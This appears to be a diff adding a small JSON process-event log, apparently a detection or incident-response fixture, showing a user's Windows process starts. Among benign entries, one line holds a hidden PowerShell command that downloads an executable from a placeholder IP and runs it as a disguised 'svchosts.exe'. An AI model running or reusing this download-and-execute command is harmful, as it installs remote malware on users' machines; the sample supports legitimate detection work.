@@ -1,0 +1,6 @@
+{"time": "2026-10-14T08:01:00Z", "event": "start", "pid": 3010, "ppid": 3120, "image": "C:\\Users\\mrojas\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe", "cmdline": "", "user": "EMPRESA\\mrojas"}
+{"time": "2026-10-14T08:10:00Z", "event": "start", "pid": 4412, "ppid": 3120, "image": "C:\\Windows\\System32\\notepad.exe", "cmdline": "notepad.exe C:\\Users\\mrojas\\notas.txt", "user": "EMPRESA\\mrojas"}
+{"time": "2026-10-14T08:40:00Z", "event": "stop", "pid": 4412, "ppid": 3120, "image": "C:\\Windows\\System32\\notepad.exe", "cmdline": "", "user": "EMPRESA\\mrojas"}
+{"time": "2026-10-14T09:00:00Z", "event": "start", "pid": 5120, "ppid": 700, "image": "C:\\Program Files\\Veeam\\backup.exe", "cmdline": "", "user": "EMPRESA\\mrojas"}
+{"time": "2026-10-14T11:02:00Z", "event": "start", "pid": 2280, "ppid": 3120, "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "cmdline": "powershell -w hidden -c iwr http://198.51.100.12/s.exe -OutFile C:\\Users\\Public\\svchosts.exe; Start-Process C:\\Users\\Public\\svchosts.exe", "user": "EMPRESA\\mrojas"}
+{"time": "2026-10-14T11:02:40Z", "event": "start", "pid": 4412, "ppid": 2280, "image": "C:\\Users\\Public\\svchosts.exe", "cmdline": "svchosts.exe -k netsvcs --silent", "user": "EMPRESA\\mrojas"}
